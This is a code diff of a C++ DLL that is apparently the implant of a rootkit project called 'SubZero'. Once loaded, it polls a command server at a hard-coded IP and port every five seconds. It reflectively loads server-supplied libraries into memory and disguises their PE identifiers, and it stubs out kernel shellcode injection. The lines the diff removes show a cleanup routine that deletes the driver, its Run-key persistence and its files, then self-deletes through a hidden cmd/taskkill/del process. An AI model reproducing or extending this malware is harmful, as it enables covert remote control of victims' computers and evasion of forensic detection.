@@ -1,112 +1,67 @@
 #include "pch.h"
 #include "HttpClient.h"
 #include "ReflectiveLibraryLoader.h"
-#include "../SubZeroDriver/SubZeroCommon.h"
-#include "../SubZeroClient/SubZeroLoaderCommon.h"
 #include "../SubZeroUtils/RegistryManager.h"
 #include "../SubZeroUtils/ServiceManager.h"
-#include "../SubZeroUtils/AutoRegistryKeyHandle.h"
+#include "../SubZeroCleanup/SubZeroCleanup.h"
 
-const std::string IpAddress = "192.168.14.139";
-constexpr DWORD Port = 8080;
-constexpr DWORD SecondsBetweenFetches = 5;
+constexpr int SecondsToMilliseconds(int seconds) { return seconds * 1000; }
 
-BOOL SubZeroCleanup() {	
-    try {
-    	// Uninstall Subzero driver
-        const ServiceManager serviceManager(DRIVER_NAMEW, DRIVER_FULL_PATH, SERVICE_KERNEL_DRIVER);
-        serviceManager.stopAndRemove();
+const std::string IpAddress("192.168.14.139");
+constexpr int Port = 8080;
+constexpr int SecondsBetweenFetches = 5;
 
-    	// Delete registry key
-        const AutoRegistryKeyHandle autoRegKey(RegistryManager::OpenRegistryKey(REG_SZ_KEY_ROOT, REG_RUN_KEY_PATH));
-        RegistryManager::DeleteRegistryValue(autoRegKey.get(), DRIVER_NAMEW);
-    }
-	catch(std::exception& exception) {
-		// TODO: Handle exception accordingly
-        return FALSE;
-	}
-
-	// Delete files
-    if (!(::DeleteFileW(DRIVER_FULL_PATH.c_str())))
-        if (::GetLastError() != ERROR_FILE_NOT_FOUND)
-            // TODO: Handle exception accordingly
-			return FALSE;
-
-    if (!(::DeleteFileW(LOADER_FULL_PATH.c_str())))
-        if (::GetLastError() != ERROR_FILE_NOT_FOUND)
-            // TODO: Handle exception accordingly
-            return FALSE;
-
-	// Delete current DLL file after its process exits        
-    WCHAR command[MAX_PATH + 100];    
-    DWORD index = swprintf_s(command, MAX_PATH + 100, L"cmd.exe /c timeout 5 > NUL && taskkill /f /PID %d && ", ::GetCurrentProcessId());
-    swprintf_s(command + index, MAX_PATH + 100 - index - 1, L"del \"%ws\"", DLL_FULL_PATH.c_str());	
-      
-    STARTUPINFO si = { 0 };
-    PROCESS_INFORMATION pi = { 0 };
-
-    // Creates a cmd child process
-    return ::CreateProcessW(
-        nullptr,					// Module
-        command,					// Command-line
-        nullptr,                    // Process security attributes
-        nullptr,                    // Primary thread security attributes
-        TRUE,						// Handles are inherited
-        CREATE_NO_WINDOW,           // Creation flags
-        nullptr,                    // Environment (use parent)
-        nullptr,                    // Current directory (use parent)
-        &si,                        // STARTUPINFO pointer
-        &pi                         // PROCESS_INFORMATION pointer
-    );
-}
-
-BOOL ResponseHandler(ServerOpcode ServerOC, const PVOID Data, SIZE_T DataLength, std::string* ReturnedData) {
-    BOOL success = FALSE;
-    PMEMORY_MODULE hModule;
-
+void ResponseHandler(ServerOpcode ServerOC, const PVOID Data, size_t DataLength, std::string* ReturnedData)
+{
+    PMEMORY_MODULE hModule = nullptr;
+	
     switch (ServerOC)
     {
     case ServerOpcode::LoadLibraryReflectively:
         hModule = ReflectiveLibraryLoader::MemoryLoadLibrary(Data, DataLength);
-        if (hModule) {
-            ReflectiveLibraryLoader::OverridePeStringIdentifiers(hModule);
-            success = TRUE;
-        }       
-        break;
+		if (nullptr == hModule)
+            throw std::runtime_error("[-] Library module object failed to initialize");
+    	
+		ReflectiveLibraryLoader::OverridePeStringIdentifiers(hModule);
+        break;               
+    
     case ServerOpcode::InjectKernelShellcode:
         // TODO
         break;
+    	
     case ServerOpcode::Cleanup:
-        success = SubZeroCleanup();
-        break;    	
-    default:
+        SubZeroCleanup::Cleanup();
         break;
+    	
+    default:        
+        throw std::runtime_error("[-] Unknown opcode");
     }
-    return success;
 }
 
-BOOL APIENTRY DllMain( HMODULE hModule,
-                       DWORD  ul_reason_for_call,
-                       LPVOID lpReserved
-                     )
+BOOL APIENTRY DllMain( HMODULE, DWORD ul_reason_for_call, LPVOID)
 {
-    auto httpClient = new HttpClient(IpAddress, Port, ResponseHandler);
+	std::unique_ptr<HttpClient> httpClient(new HttpClient(IpAddress, Port, ResponseHandler));
 	
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
+	    try {
+            // Endless loop, preventing from the APC queue to empty and launch a Chrome window
+            while (true) {
+                if (httplib::Error::Success != httpClient->FetchFromServer()) {
 
-        // Endless loop, preventing from the APC queue to empty and launch a Chrome window
-        for (;;) {
-            if (httpClient->FetchFromServer() != httplib::Error::Success) {
+                    // Error connecting to server - Try again in 5 seconds
+                    httpClient.release();
+                    httpClient.reset(new HttpClient(IpAddress, Port, ResponseHandler));
+                }
 
-            	// Error connecting to server - Try again in 5 seconds
-                delete httpClient;
-            	httpClient = new HttpClient(IpAddress, Port, ResponseHandler);
+                ::Sleep(SecondsToMilliseconds(SecondsBetweenFetches));
             }
-        	
-            Sleep(SecondsBetweenFetches * 1000);
-        }                
+	    }
+	    catch (...) {
+	    	// Unknown exception
+            SubZeroCleanup::Cleanup();
+	    }     
 
     case DLL_THREAD_ATTACH:
     case DLL_THREAD_DETACH:
